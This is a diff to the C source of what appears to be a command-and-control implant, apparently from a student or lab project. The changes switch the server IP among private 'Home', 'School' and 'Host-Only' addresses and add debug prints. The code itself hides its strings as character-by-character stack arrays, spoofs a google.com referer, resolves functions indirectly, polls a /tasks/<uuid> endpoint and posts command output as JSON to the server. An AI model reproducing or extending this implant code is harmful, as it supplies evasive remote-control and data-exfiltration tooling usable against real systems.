@@ -364,16 +364,14 @@ LPVOID winHTTPClient(PAPI api, PDWORD pdwDllSize)
 
     WCHAR wReferer[] = { 'h', 't', 't', 'p', 's', ':', '/', '/', 'g', 'o', 'o', 'g', 'l', 'e', '.', 'c', 'o', 'm', 0 };
 
-    /*
     // Home
-    WCHAR wServer[] = { '1', '9', '2', '.', '1', '6', '8', '.', '1', '.', '2', '0', 0 };
-    */
+    WCHAR wServer[] = { '1', '9', '2', '.', '1', '6', '8', '.', '1', '.', '1', '6', 0 };
 
     // School
     //WCHAR wServer[] = { '1', '4', '5', '.', '9', '3', '.', '5', '3', '.', '2', '1', '5', 0 };
 
     // Host-Only
-    WCHAR wServer[] = { '1', '9', '2', '.', '1', '6', '8', '.', '0', '.', '1', 0 };
+    // WCHAR wServer[] = { '1', '9', '2', '.', '1', '6', '8', '.', '0', '.', '1', 0 };
 
     WCHAR wProxy[] = { 'W', 'I', 'N', 'H', 'T', 'T', 'P', '_', 'N', 'O', '_', 'P', 'R', 'O', 'X', 'Y', '_', 'N', 'A', 'M', 'E', 0 };
     WCHAR wProxyBypass[] = { 'W', 'I', 'N', 'H', 'T', 'T', 'P', '_', 'N', 'O', '_', 'P', 'R', 'O', 'X', 'Y', '_', 'B', 'Y', 'P', 'A', 'S', 'S', 0 };
@@ -950,7 +948,7 @@ void myMain()
     PEsgStdApi->Whoami = GetSymbolAddress((HANDLE)pEsgStdDll, whoami_c);
     ((PRINTF)api->printf)("\n%p\n",PEsgStdApi->Whoami);
 
-    WCHAR wServer[] = { '1', '9', '2', '.', '1', '6', '8', '.', '0', '.', '1', 0 };
+    WCHAR wServer[] = { '1', '9', '2', '.', '1', '6', '8', '.', '1', '.', '1', '6', 0 };
     WCHAR tasksPath[] = { '/', 't', 'a', 's', 'k', 's', '/', 0 };
     WCHAR uuid[] = { '1', '1', 'e', '3', 'b', '2', '7', 'c', '-', 'a', '1', 'e', '7', '-', '4', '2', '2', '4', '-', 'b', '4', 'd', '9', '-', '3', 'a', 'f', '3', '6', 'f', 'a', '2', 'f', '0', 'd', '0', 0 };
     WCHAR* fullPath = myConcatW(api, tasksPath, uuid);
@@ -1050,6 +1048,9 @@ void myMain()
             '4', '2', '2', '4', '-', 'b', '4', 'd', '9', '-', '3', 'a', 'f', '3', '6', 'f',
             'a', '2', 'f', '0', 'd', '0', 0
         };
+        ((PRINTF)api->printf)("%d\n", totalJsonSize);
+        ((PRINTF)api->printf)("%d\n", myStrlenA(json));
+        ((PRINTF)api->printf)("%s\n", json);
         PostRequest(api, wServer, port, fullPath2, json);
 
         if (taskOutput)
